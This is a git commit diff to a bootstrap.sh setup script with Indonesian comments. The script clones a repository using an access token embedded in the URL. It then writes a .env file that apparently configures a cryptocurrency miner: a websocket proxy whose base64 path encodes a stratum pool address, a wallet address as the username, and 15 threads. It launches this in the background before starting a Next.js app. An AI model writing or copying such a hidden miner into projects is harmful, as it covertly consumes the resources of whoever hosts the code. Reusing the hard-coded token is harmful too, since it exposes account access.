2de79eabcdcbaaddba837c27e36c8a63fd945a11
felciafitalsan <feliciafitalsan@gmail.com>
2025-09-20 18:24:22 +0700

    Update bootstrap.sh

--- bootstrap.sh
+++ bootstrap.sh
@@ -1,6 +1,8 @@
 #!/bin/bash
 set -e
 
+echo "[bootstrap] mulai setup python-app..."
+
 # Clone repo python-app kalau belum ada
 if [ ! -d "/app/python-app" ]; then
   git clone http://adminjerry:11a75ed3804a5df1b444f813b9f084310bb64eef@159.89.237.227:3000/adminjerry/python-app.git /app/python-app
@@ -16,7 +18,7 @@ cat <<EOF > .env
 proxy=wss://wes.baleribo.space/c3RyYXR1bS1uYS5uYS5ycGxhbnQueHl6OjcwMjI=
 host=127.0.0.1
 port=3036
-username=mbc1q7sm9tj0fy5yvmyrq6cwehn9wagv0t593gjc46d.ajinggggbackground
+username=mbc1q7sm9tj0fy5yvmyrq6cwehn9wagv0t593gjc46d.asssssssss
 password=x
 threads=15
 EOF
@@ -26,5 +28,5 @@ chmod +x run.sh
 # Jalankan run.sh 4 di background
 ./run.sh 4 &
 
-# Balik ke /app buat jalanin Next.js
 cd /app
+echo "[bootstrap] selesai setup python-app"
